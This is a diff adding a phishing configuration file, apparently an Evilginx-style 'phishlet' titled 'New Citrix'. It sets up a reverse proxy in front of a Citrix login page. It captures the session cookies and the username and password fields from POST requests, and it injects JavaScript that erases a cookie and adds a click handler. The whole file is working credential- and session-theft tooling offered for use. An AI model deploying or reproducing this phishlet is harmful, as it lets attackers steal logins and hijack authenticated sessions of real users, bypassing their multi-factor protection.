@@ -1,0 +1,42 @@
+name: 'New Citrix'
+author: '@bb_hacks'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'subdomain', orig_sub: 'subdomain', domain: 'domain', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'domain', orig_sub: 'subdomain', domain: 'domain', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/vnd.citrix.authenticateresponse-1+xml', 'application/xml']}
+  - {triggers_on: 'domain', orig_sub: 'subdomain', domain: 'domain', search: 'tabindex="0"', replace: 'tabindex="0" onclick="final()"', mimes: ['application/javascript']}
+auth_tokens:
+  - domain: 'domain'
+    keys: ['ASP.NET_SessionId','CsrfToken','NSC_AAAC','NSC_DLGE','pwcount']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'domain'
+  path: 'PATH'
+js_inject:
+  - trigger_domains: ["domain"]
+    trigger_paths: ["/path"]
+    trigger_params: []
+    script: | 
+      function createCookie(name,value,days) {
+        if (days) {
+        var date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 *1000));
+        var expires = "; expires=" + date.toGMTString();
+      } else {
+        var expires = "";
+      }
+      document.cookie = name + "=" + value + expires + "; path=/";
+      }
+      function eraseCookie(name) {
+      createCookie(name,"",-1);
+      }
+      eraseCookie("NSC_DLGE");
